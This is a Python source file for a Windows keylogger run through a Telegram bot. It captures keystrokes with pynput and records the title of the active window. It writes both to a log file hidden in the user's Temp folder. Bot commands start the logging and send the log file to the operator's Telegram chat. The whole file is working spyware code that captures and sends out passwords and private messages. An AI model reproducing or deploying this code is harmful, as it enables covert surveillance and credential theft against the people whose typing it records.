#!/usr/bin/env python3
import threading, config, os.path, getpass
from telegram.ext import CommandHandler, Updater
from datetime import datetime
from pynput.keyboard import Key, Listener
from telegram import update
from win32 import win32gui

updater = Updater(token=config.TelegramToken, use_context=True)
dispatcher = updater.dispatcher

count = 0
keys = []
active_window = ""
date_time = datetime.now()
user = getpass.getuser()
path = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\log.txt"

def start(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="I'm a bot, please talk to me!")

def sendmessage(update, context, message):
    context.bot.send_message(chat_id=update.effective_chat.id, text=message)


def while_press(key):
    global keys, count, active_window

    window = win32gui
    keys.append(key)
    count += 1

    # checks what windows the current user is in and appends current window in logfile
    if active_window != window.GetWindowText(window.GetForegroundWindow()):
        active_window = window.GetWindowText(window.GetForegroundWindow())
        log = open(path, "a")
        log.write("\n\n" + "NEW WINDOW! NEW WINDOW = " + str(active_window) + " AT " + str(date_time) + "\n\n")
        log.close()

    # if over 25 characters typed, write to log
    if count >= 25:
        count = 0
        write_file(keys)
        keys=[]
    # if key backspace has been detected delete last entry('s)
    if str(key) == "Key.backspace":
        keys = keys[:-1]


def write_file(keys):
    with open(path, "a") as f:
        for key in keys:
            # checks for keystrokes and replaces them to make it clearer
            k = str(key).replace("'", "").replace("Key.shift", "").replace("Key.enter", "<Enter>").replace("Key.caps_lock","").replace("Key.tab", "<tab>").replace("Key.alt", "<alt>")
            # if space has been entered, skip to next line
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("key") == -1:
                f.write(k)


# starts the keylog and sends mesasge in telegram chat that it has been started
def keylogstart(update, context):
    with Listener(on_press= while_press) as listener:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Keylogger started!")
        listener.join()


def getlog(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Log Downloading.....")
    user = getpass.getuser()
    file_id = str(path)
    context.bot.sendDocument(chat_id=update.effective_chat.id, document=open(file_id, "rb"))


def main():

    # /start command
    dispatcher.add_handler(CommandHandler('start', start))

    # /start-keylog command
    dispatcher.add_handler(CommandHandler('startkeylog', keylogstart))

    # /download keylog log
    dispatcher.add_handler(CommandHandler('getlog', getlog))
    updater.start_polling()

if __name__ == "__main__":
    main()
